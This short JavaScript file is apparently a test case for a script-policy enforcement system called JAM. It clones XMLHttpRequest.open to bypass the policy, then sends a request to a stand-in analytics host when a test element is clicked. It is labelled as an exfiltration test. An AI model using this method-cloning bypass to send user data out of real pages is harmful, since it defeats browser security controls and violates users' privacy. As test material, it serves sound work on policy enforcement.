// exfil_test_clone3.js
function exfiltrate_key_history() {
  function v0() {
    function temp() {
      return JAM.call(that.apply, that, [this, arguments], JAM.policy.p1);
    }
    var that = this;
    var key$$14;
    for (key$$14 in this) {
      if (JAM.call(this.hasOwnProperty, this, [key$$14], JAM.policy.p1)) {
        JAM.set(temp, key$$14, this[key$$14]);
      }
    }
    return temp;
  }
  xmlhttp = new XMLHttpRequest;
  xmlhttp.open.clone = v0;
  var v3 = xmlhttp;
  var v5 = xmlhttp.open;
  var v6 = JAM.call(v5.clone, v5, [], JAM.policy.p1);
  v3.opennew = v6;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true], JAM.policy.p1);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p1);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
